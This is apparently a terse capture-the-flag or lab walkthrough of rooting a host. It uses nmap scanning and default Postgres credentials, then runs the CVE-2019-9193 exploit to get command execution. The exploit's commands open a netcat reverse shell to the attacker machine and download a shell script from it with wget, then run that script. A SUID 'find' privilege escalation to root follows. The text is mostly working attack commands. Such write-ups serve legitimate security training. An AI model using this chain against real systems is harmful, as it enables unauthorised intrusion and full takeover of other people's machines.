nmap shows ports 21, 22, 80, 5437 postgres open
ftp locked down, nothing on the webpage

`sudo nmap -Pn -sC -sV -vv 192.168.244.47 -p5437 --script=vuln`
shows a bunch of postgres vuln
we painfully search for the cves exploit, and find one.
CVE-2019-9193
https://www.exploit-db.com/exploits/50847
we had to verify login default creds postgres:postgres
`psql -h 192.168.244.47 -p 5437 -U postgres -W` postgre sql
```zsh
python postgre_authenticated_expl.py -i 192.168.244.47 -p 5437 -c whoami
python postgre_authenticated_expl.py -i 192.168.244.47 -p 5437 -c 'nc -nv 192.168.45.247 80 -e /bin/sh'
#gave us the shell
#but it was very non-interractive
python postgre_authenticated_expl.py -i 192.168.244.47 -p 5437 -c 'wget 192.168.45.247/rshell.sh -O /dev/shm/rshell.sh'
python postgre_authenticated_expl.py -i 192.168.244.47 -p 5437 -c 'chmod +x /dev/shm/rshell.sh'
python postgre_authenticated_expl.py -i 192.168.244.47 -p 5437 -c 'bash /dev/shm/rshell.sh'
#now we get a good shell
```
postgres!!

---
`find / -type f -perm -04000 -ls 2>/dev/null`
shows find has SUID set, gtfo bins
`find . -exec /bin/sh -p \; -quit`
and root!
